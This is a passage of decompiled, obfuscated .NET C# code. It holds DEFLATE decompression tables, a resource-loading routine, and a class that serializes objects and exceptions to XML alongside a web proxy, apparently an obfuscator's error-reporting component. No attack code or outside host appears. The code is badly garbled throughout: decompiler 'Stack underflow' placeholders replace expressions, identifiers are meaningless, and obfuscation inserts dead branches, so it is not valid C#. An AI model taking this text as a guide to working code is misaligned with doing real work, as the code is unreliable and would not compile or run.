					global::_0005._0011._0001((int)/*Error near IL_005e: Stack underflow*/);
					return (string)/*Error near IL_0038: Stack underflow*/;
					IL_0020:
					_003F val = /*Error near IL_0021: Stack underflow*/- num;
					if (0 == 0)
					{
						P_0 = (int)val;
					}
					_ = _0003._0001;
					goto IL_002a;
				}
				string result = default(string);
				return result;
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, (object)P_0);
				throw;
			}
		}

		static _0003()
		{
			//IL_00da: Incompatible stack heights: 0 vs 3
			//IL_00e1: Incompatible stack heights: 0 vs 1
			//IL_00f9: Incompatible stack heights: 0 vs 1
			//IL_0103: Incompatible stack heights: 0 vs 1
			//IL_010d: Incompatible stack heights: 0 vs 1
			//IL_0117: Incompatible stack heights: 0 vs 1
			//IL_0121: Incompatible stack heights: 0 vs 2
			//IL_012b: Incompatible stack heights: 0 vs 1
			Stream stream = default(Stream);
			int num2 = default(int);
			byte[] array = default(byte[]);
			try
			{
				_0003.m__0001 = "1";
				if (false)
				{
					return;
				}
				_0002 = "98";
				_0003._0001 = null;
				new object();
				_0003._0001 = (object)/*Error near IL_002a: Stack underflow*/;
				_0003._0001 = false;
				_0003.m__0001 = 0;
				while (true)
				{
					global::_0008._0095(_0003.m__0001, "1");
					if ((int)/*Error near IL_004c: Stack underflow*/ != 0)
					{
						if (6 == 0)
						{
							break;
						}
						if (0 == 0)
						{
							if (1 == 0)
							{
								continue;
							}
							_0003._0001 = true;
						}
						new Dictionary<int, string>();
						_0003._0001 = (Dictionary<int, string>)/*Error near IL_0068: Stack underflow*/;
					}
					_0087._0008_0003(_0002);
					_0003.m__0001 = (int)/*Error near IL_007c: Stack underflow*/;
					_ = _0089._007E_000F_0003;
					_0088._000E_0003();
					/*Error near IL_012b: Stack underflow*/((object)/*Error near IL_012b: Stack underflow*/, "{d0b6abba-9b06-463e-ba7a-3c70a76cc089}");
					stream = (Stream)/*Error near IL_0131: Stack underflow*/;
					try
					{
						if (4u != 0)
						{
							_ = _008B._0011_0003;
							_ = _008A._007E_0010_0003;
							/*Error near IL_00e1: Stack underflow*/((object)/*Error near IL_00e1: Stack underflow*/);
							int num = /*Error near IL_00b0: Stack underflow*/((long)/*Error near IL_00b0: Stack underflow*/);
							do
							{
								num2 = num;
								array = new byte[num2];
								num = _008C._007E_0012_0003(stream, array, 0, num2);
							}
							while (7 == 0);
							_0003._0001 = global::_0005._0011._0001(array);
						}
						array = null;
						break;
					}
					finally
					{
						if (stream != null)
						{
							global::_000F._007E_0099(stream);
						}
					}
				}
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, (object)stream, (object)num2, (object)array);
				throw;
			}
		}
	}
}
namespace _0004
{
	[AttributeUsage(AttributeTargets.Assembly | AttributeTargets.Module | AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Enum | AttributeTargets.Constructor | AttributeTargets.Method | AttributeTargets.Property | AttributeTargets.Field | AttributeTargets.Event | AttributeTargets.Interface | AttributeTargets.Parameter | AttributeTargets.Delegate)]
	internal sealed class _0004 : Attribute
	{
	}
}
namespace _0003
{
	[AttributeUsage(AttributeTargets.Method)]
	internal sealed class _0006 : Attribute
	{
	}
}
namespace _0010
{
	internal enum _0004
	{
		_0001,
		_0002,
		_0003,
		_0004
	}
}
namespace _0008
{
	internal static class _0004
	{
		internal sealed class _0001
		{
			internal static readonly int[] _0001;

			internal static readonly int[] _0002;

			internal static readonly int[] _0003;

			internal static readonly int[] _0004;

			internal int _0001;

			internal int _0002;

			internal int _0003;

			internal int _0004;

			internal int _0005;

			internal bool _0001;

			internal _0002 _0001;

			internal _0003 _0001;

			internal _0005 _0001;

			internal _0004 _0001;

			internal _0004 _0002;

			public _0001(byte[] P_0)
			{
				try
				{
					this._0001 = new _0002();
					this._0001 = new _0003();
					this._0001 = 2;
					global::_0005._0011._0001(P_0, P_0.Length, this._0001, 0);
				}
				catch (Exception ex)
				{
					global::_0005._0011._0001(ex, (object)this, (object)P_0);
					throw;
				}
			}

			static _0001()
			{
				//IL_0066: Incompatible stack heights: 0 vs 1
				//IL_006d: Incompatible stack heights: 0 vs 1
				//IL_0074: Incompatible stack heights: 0 vs 1
				//IL_007b: Incompatible stack heights: 0 vs 1
				try
				{
					while (true)
					{
						if (7u != 0 && 0 == 0)
						{
							_ = new int[29]
							{
								3, 4, 5, 6, 7, 8, 9, 10, 11, 13,
								15, 17, 19, 23, 27, 31, 35, 43, 51, 59,
								67, 83, 99, 115, 131, 163, 195, 227, 258
							};
							global::_0008._0004._0001._0001 = (int[])/*Error near IL_001a: Stack underflow*/;
							_ = new int[29]
							{
								0, 0, 0, 0, 0, 0, 0, 0, 1, 1,
								1, 1, 2, 2, 2, 2, 3, 3, 3, 3,
								4, 4, 4, 4, 5, 5, 5, 5, 0
							};
							global::_0008._0004._0001._0002 = (int[])/*Error near IL_002e: Stack underflow*/;
						}
						if (6u != 0)
						{
							if (0 == 0)
							{
								_ = new int[30]
								{
									1, 2, 3, 4, 5, 7, 9, 13, 17, 25,
									33, 49, 65, 97, 129, 193, 257, 385, 513, 769,
									1025, 1537, 2049, 3073, 4097, 6145, 8193, 12289, 16385, 24577
								};
								global::_0008._0004._0001._0003 = (int[])/*Error near IL_0048: Stack underflow*/;
							}
							_ = new int[30]
							{
								0, 0, 0, 0, 1, 1, 2, 2, 3, 3,
								4, 4, 5, 5, 6, 6, 7, 7, 8, 8,
								9, 9, 10, 10, 11, 11, 12, 12, 13, 13
							};
							global::_0008._0004._0001._0004 = (int[])/*Error near IL_005c: Stack underflow*/;
							if (4u != 0)
							{
								break;
							}
						}
					}
				}
				catch (Exception ex)
				{
					global::_0005._0011._0001(ex);
					throw;
				}
			}
		}

		internal sealed class _0002
		{
			internal byte[] _0001;

			internal int _0001;

			internal int _0002;

			internal uint _0001;

			internal int _0003;
		}

		internal sealed class _0003
		{
			internal byte[] _0001 = new byte[32768];

			internal int _0001;

			internal int _0002;
		}

		internal sealed class _0004
		{
			internal short[] _0001;

			public static readonly _0004 _0001;

			public static readonly _0004 _0002;

			static _0004()
			{
				//IL_0040: Invalid comparison between Unknown and I4
				//IL_005f: Invalid comparison between Unknown and I4
				//IL_00cd: Incompatible stack heights: 0 vs 1
				//IL_00d3: Incompatible stack heights: 0 vs 1
				//IL_00d9: Incompatible stack heights: 0 vs 1
				//IL_00df: Incompatible stack heights: 0 vs 1
				//IL_00e5: Incompatible stack heights: 0 vs 1
				//IL_00eb: Incompatible stack heights: 0 vs 1
				//IL_00f1: Incompatible stack heights: 0 vs 1
				byte[] array = default(byte[]);
				int num2 = default(int);
				try
				{
					int num = 288;
					if (num != 0)
					{
						array = new byte[num];
						num = 0;
					}
					num2 = num;
					while (true)
					{
						if (0 == 0)
						{
							if ((int)/*Error near IL_0042: Stack underflow*/ >= 144)
							{
								goto IL_005a;
							}
							if (3 == 0)
							{
								goto IL_0049;
							}
							if (4u != 0)
							{
								num2++;
								((sbyte[])/*Error near IL_0033: Stack underflow*/)[/*Error near IL_0033: Stack underflow*/] = 8;
								continue;
							}
						}
						goto IL_00ab;
						IL_005a:
						if ((int)/*Error near IL_0061: Stack underflow*/ < 256)
						{
							goto IL_0049;
						}
						goto IL_006f;
						IL_00ab:
						while (num2 < 32)
						{
							array[num2++] = 5;
						}
						_0002 = new _0004(array);
						if (1 == 0)
						{
							goto IL_0068;
						}
						break;
						IL_006f:
						if (num2 < 280)
						{
							goto IL_0068;
						}
						int num3;
						while (true)
						{
							num3 = num2;
							while (num3 >= 288)
							{
								_0001 = new _0004(array);
								num3 = 32;
								if (num3 != 0)
								{
									goto end_IL_0081;
								}
							}
							array[num2++] = 8;
							continue;
							end_IL_0081:
							break;
						}
						array = new byte[num3];
						num2 = 0;
						goto IL_00ab;
						IL_0068:
						int num4 = num2++;
						((sbyte[])/*Error near IL_006f: Stack underflow*/)[num4] = 7;
						goto IL_006f;
						IL_0049:
						num2++;
						((sbyte[])/*Error near IL_0055: Stack underflow*/)[/*Error near IL_0055: Stack underflow*/] = 9;
						goto IL_005a;
					}
				}
				catch (Exception ex)
				{
					global::_0005._0011._0001(ex, (object)array, (object)num2);
					throw;
				}
			}

			public _0004(byte[] P_0)
			{
				try
				{
					global::_0005._0011._0001(P_0, this);
				}
				catch (Exception ex)
				{
					global::_0005._0011._0001(ex, (object)this, (object)P_0);
					throw;
				}
			}
		}

		internal sealed class _0005
		{
			internal static readonly int[] _0001;

			internal static readonly int[] _0002;

			internal byte[] _0001;

			internal byte[] _0002;

			internal _0004 _0001;

			internal int _0001;

			internal int _0002;

			internal int _0003;

			internal int _0004;

			internal int _0005;

			internal int _0006;

			internal byte _0001;

			internal int _0007;

			internal static readonly int[] _0003;

			static _0005()
			{
				//IL_0041: Incompatible stack heights: 0 vs 1
				//IL_0048: Incompatible stack heights: 0 vs 1
				//IL_004f: Incompatible stack heights: 0 vs 1
				try
				{
					_ = new int[3] { 3, 3, 11 };
					global::_0008._0004._0005._0001 = (int[])/*Error near IL_0013: Stack underflow*/;
					_ = new int[3] { 2, 3, 7 };
					global::_0008._0004._0005._0002 = (int[])/*Error near IL_0026: Stack underflow*/;
					_ = new int[19]
					{
						16, 17, 18, 0, 8, 7, 9, 6, 10, 5,
						11, 4, 12, 3, 13, 2, 14, 1, 15
					};
					_0003 = (int[])/*Error near IL_003a: Stack underflow*/;
				}
				catch (Exception ex)
				{
					global::_0005._0011._0001(ex);
					throw;
				}
			}
		}

		internal sealed class _0006
		{
			internal int _0001 = 16;

			internal long _0001;

			internal _000E _0001;

			internal _0008 _0001;

			public _0006()
			{
				try
				{
					this._0001 = new _000E();
					_0001 = new _0008(this._0001);
				}
				catch (Exception ex)
				{
					global::_0005._0011._0001(ex, (object)this);
					throw;
				}
			}
		}

		internal sealed class _0007
		{
			public sealed class _0001
			{
				public short[] _0001;

				public byte[] _0001;

				public int _0001;

				public int _0002;

				internal short[] _0002;

				internal int[] _0001;

				internal int _0003;

				internal _0007 _0001;

				public _0001(_0007 P_0, int P_1, int P_2, int P_3)
				{
					try
					{
						_0001 = P_0;
						this._0001 = P_2;
						_0003 = P_3;
						this._0001 = new short[P_1];
						this._0001 = new int[P_3];
					}
					catch (Exception ex)
					{
						global::_0005._0011._0001(ex, (object)this, (object)P_0, (object)P_1, (object)P_2, (object)P_3);
						throw;
					}
				}
			}

			internal static readonly int[] _0001;

			internal static readonly byte[] _0001;

			internal _000E _0001;

			internal _0001 _0001;

			internal _0001 _0002;

			internal _0001 _0003;

			internal short[] _0001;

			internal byte[] _0002;

			internal int _0001;

			internal int _0002;

			internal static readonly short[] _0002;

			internal static readonly byte[] _0003;

			internal static readonly short[] _0003;

			internal static readonly byte[] _0004;

			static _0007()
			{
				//IL_0065: Unknown result type (might be due to invalid IL or missing references)
				//IL_0067: Unknown result type (might be due to invalid IL or missing references)
				//IL_0087: Incompatible stack heights: 1 vs 0
				//IL_0167: Incompatible stack heights: 0 vs 1
				//IL_0171: Incompatible stack heights: 0 vs 1
				//IL_017d: Incompatible stack heights: 0 vs 2
				//IL_0183: Incompatible stack heights: 0 vs 2
				//IL_018d: Expected I4, but got Unknown
				//IL_018d: Incompatible stack heights: 0 vs 1
				//IL_0193: Incompatible stack heights: 0 vs 2
				//IL_0199: Incompatible stack heights: 0 vs 1
				//IL_019f: Incompatible stack heights: 0 vs 2
				int num2 = default(int);
				try
				{
					_ = new int[19]
					{
						16, 17, 18, 0, 8, 7, 9, 6, 10, 5,
						11, 4, 12, 3, 13, 2, 14, 1, 15
					};
					_0007._0001 = (int[])/*Error near IL_0017: Stack underflow*/;
					_ = new byte[16]
					{
						0, 8, 4, 12, 2, 10, 6, 14, 1, 9,
						5, 13, 3, 11, 7, 15
					};
					_0007._0001 = (byte[])/*Error near IL_002e: Stack underflow*/;
					int num = 286;
					while (true)
					{
						_0002 = new short[num];
						_0007._0003 = new byte[286];
						while (true)
						{
							num2 = 0;
							while (7u != 0)
							{
								int num3 = 144;
								if (num3 == 0)
								{
									goto IL_00c1;
								}
								if (num < num3)
								{
									_ = _0002;
									_ = 48;
									global::_0005._0011._0001(/*Error near IL_0066: Stack underflow*/ + /*Error near IL_0066: Stack underflow*/<< 8);
									((short[])/*Error near IL_006e: Stack underflow*/)[/*Error near IL_006e: Stack underflow*/] = (short)/*Error near IL_006e: Stack underflow*/;
									if (6u != 0)
									{
										_ = _0007._0003;
										num2++;
										((sbyte[])/*Error near IL_0081: Stack underflow*/)[/*Error near IL_0081: Stack underflow*/] = 8;
										continue;
									}
									goto IL_00c3;
								}
								goto IL_00bb;
								IL_00c1:
								if (num < num3)
								{
									_ = _0002;
									short num4 = global::_0005._0011._0001(256 + num2 << 7);
									((short[])/*Error near IL_00ae: Stack underflow*/)[/*Error near IL_00ae: Stack underflow*/] = num4;
									_0007._0003[num2++] = 9;
									goto IL_00bb;
								}
								goto IL_00c3;
								IL_00bb:
								num = num2;
								num3 = 256;
								goto IL_00c1;
							}
							break;
							IL_00c3:
							if (1 == 0)
							{
								continue;
							}
							while (true)
							{
								if (num2 < 280)
								{
									_0002[num2] = global::_0005._0011._0001(-256 + num2 << 9);
									if (0 == 0)
									{
										_0007._0003[num2++] = 7;
										continue;
									}
									goto IL_015b;
								}
								goto IL_0118;
								IL_015b:
								while (true)
								{
									if (num2 < 30)
									{
										_0003[num2] = global::_0005._0011._0001(num2 << 11);
										if (false)
										{
											break;
										}
										_0004[num2] = 5;
										num2++;
										continue;
									}
									return;
								}
								goto IL_0118;
								IL_0118:
								while (num2 < 286)
								{
									_0002[num2] = global::_0005._0011._0001(-88 + num2 << 8);
									_0007._0003[num2++] = 8;
								}
								_0003 = new short[30];
								_0004 = new byte[30];
								num2 = 0;
								goto IL_015b;
							}
						}
					}
				}
				catch (Exception ex)
				{
					global::_0005._0011._0001(ex, (object)num2);
					throw;
				}
			}

			public _0007(_000E P_0)
			{
				try
				{
					this._0001 = P_0;
					this._0001 = new _0001(this, 286, 257, 15);
					this._0002 = new _0001(this, 30, 1, 15);
					this._0003 = new _0001(this, 19, 4, 7);
					this._0001 = new short[16384];
					this._0002 = new byte[16384];
				}
				catch (Exception ex)
				{
					global::_0005._0011._0001(ex, (object)this, (object)P_0);
					throw;
				}
			}
		}

		internal sealed class _0008
		{
			internal int _0001;

			internal short[] _0001;

			internal short[] _0002;

			internal int _0002;

			internal int _0003;

			internal bool _0001;

			internal int _0004;

			internal int _0005;

			internal int _0006;

			internal byte[] _0001;

			internal byte[] _0002;

			internal int _0007;

			internal int _0008;

			internal int _000E;

			internal _000E _0001;

			internal _0007 _0001;

			public _0008(_000E P_0)
			{
				int num = default(int);
				try
				{
					this._0001 = P_0;
					_0001 = new _0007(P_0);
					this._0001 = new byte[65536];
					this._0001 = new short[32768];
					this._0002 = new short[32768];
					num = (_0004 = (_0005 = 1));
				}
				catch (Exception ex)
				{
					global::_0005._0011._0001(ex, (object)num, (object)this, (object)P_0);
					throw;
				}
			}
		}

		internal sealed class _000E
		{
			protected internal byte[] _0001 = new byte[65536];

			internal int _0001;

			internal int _0002;

			internal uint _0001;

			internal int _0003;
		}

		internal sealed class _000F : MemoryStream
		{
			public _000F()
			{
			}

			public _000F(byte[] P_0)
				: base(P_0, writable: false)
			{
			}
		}

		public static string _0001;
	}
}
namespace _0002
{
	[CompilerGenerated]
	internal sealed class _0004
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 12)]
		private struct _0001
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 16)]
		internal struct _0002
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 76)]
		private struct _0003
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 116)]
		private struct _0004
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 120)]
		private struct _0005
		{
		}

		internal static readonly _0002 _0001/* Not supported: data(D0 C4 26 8F B6 F7 02 00 22 96 EC 40 F3 09 98 8D) */;

		internal static readonly _0004 _0001/* Not supported: data(03 00 00 00 04 00 00 00 05 00 00 00 06 00 00 00 07 00 00 00 08 00 00 00 09 00 00 00 0A 00 00 00 0B 00 00 00 0D 00 00 00 0F 00 00 00 11 00 00 00 13 00 00 00 17 00 00 00 1B 00 00 00 1F 00 00 00 23 00 00 00 2B 00 00 00 33 00 00 00 3B 00 00 00 43 00 00 00 53 00 00 00 63 00 00 00 73 00 00 00 83 00 00 00 A3 00 00 00 C3 00 00 00 E3 00 00 00 02 01 00 00) */;

		internal static readonly _0001 _0001/* Not supported: data(02 00 00 00 03 00 00 00 07 00 00 00) */;

		internal static readonly _0002 _0002/* Not supported: data(00 08 04 0C 02 0A 06 0E 01 09 05 0D 03 0B 07 0F) */;

		internal static readonly _0005 _0001/* Not supported: data(00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 02 00 00 00 02 00 00 00 03 00 00 00 03 00 00 00 04 00 00 00 04 00 00 00 05 00 00 00 05 00 00 00 06 00 00 00 06 00 00 00 07 00 00 00 07 00 00 00 08 00 00 00 08 00 00 00 09 00 00 00 09 00 00 00 0A 00 00 00 0A 00 00 00 0B 00 00 00 0B 00 00 00 0C 00 00 00 0C 00 00 00 0D 00 00 00 0D 00 00 00) */;

		internal static readonly _0003 _0001/* Not supported: data(10 00 00 00 11 00 00 00 12 00 00 00 00 00 00 00 08 00 00 00 07 00 00 00 09 00 00 00 06 00 00 00 0A 00 00 00 05 00 00 00 0B 00 00 00 04 00 00 00 0C 00 00 00 03 00 00 00 0D 00 00 00 02 00 00 00 0E 00 00 00 01 00 00 00 0F 00 00 00) */;

		internal static readonly _0002 _0003/* Not supported: data(DB 28 AF 2A 84 0C FD AF 1B 3B 6B 99 DE D0 C3 26) */;

		internal static readonly _0001 _0002/* Not supported: data(03 00 00 00 03 00 00 00 0B 00 00 00) */;

		internal static readonly _0004 _0002/* Not supported: data(00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00 02 00 00 00 02 00 00 00 02 00 00 00 02 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 04 00 00 00 04 00 00 00 04 00 00 00 04 00 00 00 05 00 00 00 05 00 00 00 05 00 00 00 05 00 00 00 00 00 00 00) */;

		internal static readonly _0005 _0002/* Not supported: data(01 00 00 00 02 00 00 00 03 00 00 00 04 00 00 00 05 00 00 00 07 00 00 00 09 00 00 00 0D 00 00 00 11 00 00 00 19 00 00 00 21 00 00 00 31 00 00 00 41 00 00 00 61 00 00 00 81 00 00 00 C1 00 00 00 01 01 00 00 81 01 00 00 01 02 00 00 01 03 00 00 01 04 00 00 01 06 00 00 01 08 00 00 01 0C 00 00 01 10 00 00 01 18 00 00 01 20 00 00 01 30 00 00 01 40 00 00 01 60 00 00) */;
	}
}
namespace _000E
{
	internal sealed class _0004
	{
		public static string _0001;
	}
}
namespace _0002
{
	internal sealed class _0005 : _0006
	{
		private new struct _0001
		{
			public readonly string _0001;

			public readonly string _0002;

			public readonly string _0003;

			public readonly int _0001;
		}

		internal struct _0002
		{
			public readonly string _0001;

			public readonly string _0002;

			public _0002(string P_0, string P_1)
			{
				_0001 = P_0;
				_0002 = P_1;
			}
		}

		internal new struct _0003
		{
			public string _0001;

			public _0002 _0001;

			[SpecialName]
			public bool _0001()
			{
				//IL_000f: Invalid comparison between Unknown and I4
				//IL_0013: Incompatible stack heights: 0 vs 2
				//IL_001a: Incompatible stack heights: 0 vs 1
				_ = global::_0001._007E_0001;
				string text = ((_0003)/*Error near IL_000c: Stack underflow*/)._0001;
				/*Error near IL_001a: Stack underflow*/(text);
				return (int)/*Error near IL_0011: Stack underflow*/ == 0;
			}

			[SpecialName]
			public static _0003 _0001()
			{
				//IL_0017: Incompatible stack heights: 0 vs 1
				new _0003(string.Empty, string.Empty, string.Empty);
				return (_0003)/*Error near IL_0012: Stack underflow*/;
			}

			private _0003(string P_0, string P_1, string P_2)
			{
				this._0001 = P_0;
				this._0001 = new _0002(P_1, P_2);
			}
		}

		private new readonly Exception m__0001;

		private new readonly Guid m__0001;

		internal new readonly char[] _0001 = new char[0];

		private new readonly Dictionary<string, object> m__0001 = new Dictionary<string, object>();

		private new readonly Dictionary<string, _0001> m__0001 = new Dictionary<string, _0001>();

		internal new XmlWriter _0001;

		private new readonly List<global::_0004._0005> m__0001 = new List<global::_0004._0005>();

		private new readonly List<string> m__0001 = new List<string>();

		private new readonly Dictionary<string, int> m__0001 = new Dictionary<string, int>();

		internal new readonly List<_0002> _0001 = new List<_0002>();

		internal readonly Dictionary<string, int> _0002 = new Dictionary<string, int>();

		private new MemoryStream m__0001;

		private new byte[] m__0001;

		[CompilerGenerated]
		internal new global::_000F._0002 _0001;

		[CompilerGenerated]
		internal new EventHandler _0001;

		public _0005(Guid P_0, Exception P_1, IWebProxy P_2)
		{
			this.m__0001 = P_0;
			this.m__0001 = P_1;
			base._0001 = P_2;
			string text = global::_000E._0003._0001(107395679).ToUpper();
			if (!(text == global::_000E._0003._0001(107395666)))
			{
				if (text == global::_000E._0003._0001(107395679))
				{
					this._0001 = new char[58]
					{
						'\u0001', '\u0002', '\u0003', '\u0004', '\u0005', '\u0006', '\a', '\b', '\u000e', '\u000f',
						'\u0010', '\u0011', '\u0012', '\u0013', '\u0014', '\u0015', '\u0016', '\u0017', '\u0018', '\u0019',
						'\u001a', '\u001b', '\u001c', '\u001d', '\u001e', '\u001f', '\u007f', '\u0080', '\u0081', '\u0082',
						'\u0083', '\u0084', '\u0086', '\u0087', '\u0088', '\u0089', '\u008a', '\u008b', '\u008c', '\u008d',
						'\u008e', '\u008f', '\u0090', '\u0091', '\u0092', '\u0093', '\u0094', '\u0095', '\u0096', '\u0097',
						'\u0098', '\u0099', '\u009a', '\u009b', '\u009c', '\u009d', '\u009e', '\u009f'
					};
				}
			}
			else
			{
				this._0001 = new char[62]
				{
					'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
					'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
					'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D',
					'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N',
					'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
					'Y', 'Z', '0', '1', '2', '3', '4', '5', '6', '7',
					'8', '9'
				};
			}
		}

		private new unsafe void _0001(global::_0004._0005 P_0, FieldInfo P_1)
		{
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_04f5: Incompatible stack heights: 0 vs 1
			//IL_04fb: Incompatible stack heights: 0 vs 2
			//IL_0505: Incompatible stack heights: 0 vs 1
			//IL_0511: Incompatible stack heights: 0 vs 1
			//IL_051b: Incompatible stack heights: 0 vs 1
			//IL_0525: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[8];
			if ((int)/*Error near IL_0010: Stack underflow*/ != 0)
			{
				_ = global::_0007._007E_0083;
				/*Error near IL_0505: Stack underflow*/((object)/*Error near IL_0505: Stack underflow*/);
			}
			else
			{
				_ = null;
			}
			string text = (string)/*Error near IL_050b: Stack underflow*/;
			if ((int)/*Error near IL_002e: Stack underflow*/ != 0)
			{
				global::_000E._0003._0001(107395625);
			}
			else
			{
				global::_000E._0003._0001(107395616);
			}
			string text2 = (string)/*Error near IL_052b: Stack underflow*/;
			object obj = P_0._0001;
			global::_0004._0007 obj2;
			if (obj == null)
			{
				obj2 = new global::_0004._0007(this._0001, text2);
				try
				{
					if ((object)P_1 != null)
					{
						while (true)
						{
							if (_008D._007E_0013_0003(P_1))
							{
								_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107395639), global::_000E._0003._0001(107395598));
							}
							Type type = _008F._007E_0088_0003(P_1);
							if ((object)type != null && _008D._007E_0014_0003(type))
							{
								this._0001(_008F._007E_0089_0003(type));
								if (_008D._007E_0015_0003(type))
								{
									if (3 == 0)
									{
										continue;
									}
									if (false)
									{
										return;
									}
									_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107395593), global::_000E._0003._0001(107395598));
								}
								if (_008D._007E_0016_0003(type))
								{
									_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107395584), global::_000E._0003._0001(107395598));
								}
								if (_008D._007E_0017_0003(type))
								{
									_008E obj3 = _008E._007E_0086_0003;
									XmlWriter xmlWriter = this._0001;
									string text3 = global::_000E._0003._0001(107395603);
									*(int*)ptr = global::_0001._007E_0006(type);
									obj3(xmlWriter, text3, ((int*)ptr)->ToString());
								}
							}
							else
							{
								this._0001(type);
							}
							break;
						}
					}
					if (text != null)
					{
						_0001(text);
					}
					_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107396074), global::_000E._0003._0001(107395598));
					return;
				}
				finally
				{
					while (obj2 != null)
					{
						if (6u != 0)
						{
							global::_000F._007E_0099(obj2);
							break;
						}
					}
				}
			}
			Type type2 = _008F._007E_008A_0003(P_0._0001);
			string text4 = null;
			string text5 = null;
			if (obj is string)
			{
				text4 = global::_000E._0003._0001(107396065);
			}
			if (text4 == null)
			{
				if (_008D._007E_0018_0003(type2) || obj is IntPtr || obj is UIntPtr)
				{
					text4 = global::_0007._007E_0084(type2);
					if (obj is char)
					{
						*(int*)((byte*)ptr + 4) = (char)obj;
						StringBuilder stringBuilder = new StringBuilder();
						if (*(int*)((byte*)ptr + 4) >= 32)
						{
							_0090._007E_008D_0003(stringBuilder, '\'');
							_0090._007E_008D_0003(stringBuilder, (char)obj);
							_0091._007E_008E_0003(stringBuilder, global::_000E._0003._0001(107396044));
						}
						_0091._007E_008E_0003(stringBuilder, global::_000E._0003._0001(107396039));
						_0091._007E_008E_0003(stringBuilder, ((int*)((byte*)ptr + 4))->ToString(global::_000E._0003._0001(107396034)));
						_0090._007E_008D_0003(stringBuilder, ')');
						text5 = global::_0007._007E_0086(stringBuilder);
					}
					if (obj is bool)
					{
						text5 = global::_0007._007E_0087(global::_0007._007E_0086(obj));
					}
					if (text5 == null && 0 == 0)
					{
						string text6 = global::_0005._0011._0001(obj);
						if (global::_0001._007E_0001(text6) > 0)
						{
							global::_0007 obj4 = global::_0007._007E_0086;
							StringBuilder stringBuilder2 = new StringBuilder();
							stringBuilder2.Append(global::_0007._007E_0086(obj));
							stringBuilder2.Append(global::_000E._0003._0001(107396061));
							stringBuilder2.Append(text6);
							stringBuilder2.Append(')');
							text5 = obj4(stringBuilder2);
						}
						else
						{
							text5 = global::_0007._007E_0086(obj);
						}
					}
				}
				else if (_008D._007E_0019_0003(type2) && (object)_0092._007E_008F_0003(type2) != _0092._007E_008F_0003(_008F._008A_0003(this)))
				{
					text4 = global::_0007._007E_0084(type2);
				}
			}
			obj2 = new global::_0004._0007(this._0001, text2);
			try
			{
				if ((object)P_1 != null && _008D._007E_0013_0003(P_1))
				{
					_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107395639), global::_000E._0003._0001(107395598));
				}
				if (text4 != null)
				{
					this._0001(type2);
					if (text != null)
					{
						_0001(text);
					}
					if (_008D._007E_001A_0003(type2))
					{
						text5 = global::_0007._007E_0086(obj);
					}
					if (obj is Guid)
					{
						text5 = global::_000E._0003._0001(107396052) + ((obj != null) ? global::_0007._007E_0086(obj) : null) + global::_000E._0003._0001(107396015);
					}
					if (text5 == null)
					{
						text5 = global::_000E._0003._0001(107396010) + ((obj != null) ? global::_0007._007E_0086(obj) : null) + global::_000E._0003._0001(107396010);
					}
					_008E._007E_0086_0003(this._0001, global::_000E._0003._0001(107396005), global::_0005._0011._0001(text5));
				}
				else
				{
					if ((object)P_1 != null)
					{
						this._0001(_008F._007E_0088_0003(P_1));
					}
					_0001(P_0);
					if (text != null)
					{
						_0001(text);
					}
				}
			}
			finally
			{
				if (obj2 != null)
				{
					global::_000F._007E_0099(obj2);
				}
			}
		}

		internal new unsafe void _0001(global::_0004._0005 P_0)
		{
			//IL_002b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0040: Unknown result type (might be due to invalid IL or missing references)
			//IL_00c2: Incompatible stack heights: 0 vs 1
			//IL_00ce: Incompatible stack heights: 0 vs 1
			//IL_00d4: Incompatible stack heights: 0 vs 1
			//IL_00da: Incompatible stack heights: 0 vs 1
			//IL_00e0: Incompatible stack heights: 0 vs 2
			//IL_00ea: Incompatible stack heights: 0 vs 1
			//IL_00f0: Incompatible stack heights: 0 vs 2
			void* ptr;
			do
			{
				ptr = stackalloc byte[8];
			}
			while (false);
			object obj = ((global::_0004._0005)/*Error near IL_0016: Stack underflow*/)._0001;
			do
			{
				*(int*)(nint)/*Error near IL_0022: Stack underflow*/ = -1;
			}
			while (false);
			*(int*)(nint)(/*Error near IL_002c: Stack underflow*/ + 4) = 0;
			while (true)
			{
				int num = *(int*)((byte*)ptr + 4);
				if (6u != 0)
				{
					if (num < this.m__0001.Count)
					{
						_ = ((_0005)/*Error near IL_003a: Stack underflow*/).m__0001;
						int index = *(int*)(nint)(/*Error near IL_0041: Stack underflow*/ + 4);
						_ = ((List<global::_0004._0005>)/*Error near IL_00ea: Stack underflow*/)[index];
						_ = ((global::_0004._0005)/*Error near IL_004c: Stack underflow*/)._0001;
						if (/*Error near IL_0053: Stack underflow*/ != /*Error near IL_0053: Stack underflow*/)
						{
							if (0 == 0)
							{
								(*(int*)((byte*)ptr + 4))++;
								continue;
							}
							goto IL_008e;
						}
						*(int*)ptr = *(int*)((byte*)ptr + 4);
					}
					num = *(int*)ptr;
				}
				if (num != -1)
				{
					break;
				}
				*(int*)ptr = this.m__0001.Count;
				goto IL_008e;
				IL_008e:
				this.m__0001.Add(P_0);
				break;
			}
